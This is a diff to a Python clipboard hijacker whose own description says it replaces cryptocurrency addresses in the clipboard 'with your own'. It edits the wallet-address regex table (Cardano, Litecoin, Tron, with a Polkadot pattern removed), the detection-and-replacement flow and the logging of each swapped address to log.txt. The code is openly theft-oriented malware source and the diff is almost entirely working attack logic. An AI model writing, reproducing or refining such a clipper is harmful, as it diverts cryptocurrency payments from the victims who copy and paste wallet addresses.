@@ -15,7 +15,7 @@ from datetime import datetime
 parser = argparse.ArgumentParser(
     description="Replace crypto-addresses in clipboard with your own"
 )
-parser.add_argument("--log", help="log output to log.json", action="store_true")
+parser.add_argument("--log", help="log output to log.txt", action="store_true")
 
 
 def main():
@@ -35,7 +35,7 @@ def main():
             user_clipboard, crypto_found
         )  # do the replacement
 
-        if replacement_address != 0:
+        if replacement_address != 0 and crypto_found != 0:
             log(
                 now, crypto_found, user_clipboard, replacement_address
             )  # only log if found
@@ -62,7 +62,6 @@ def sniff(user_clipboard):
         "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
         "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
         "tron": "^T[a-zA-Z0-9]{33}$",
-        "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
     }
 
     for k, v in crypto_regex_match.items():
@@ -73,21 +72,10 @@ def sniff(user_clipboard):
 
 
 def log(current_time, crypto_found, user_clipboard, replacement_address):
-    if crypto_found != 0:
-        with open("log.txt", "a+") as log:
-            log.write(
-                "["
-                + str(current_time)
-                + "]: "
-                + str(crypto_found.upper())
-                + " in clipboard "
-                + "("
-                + str(user_clipboard)
-                + ") "
-                + "replacing with -> "
-                + str(replacement_address)
-                + "\n"
-            )
+    with open("log.txt", "a+") as log:
+        log.write(
+            f"[{current_time}]: {crypto_found.upper()} in clipboard ({user_clipboard}) -> {replacement_address}"
+        )
 
 
 main()
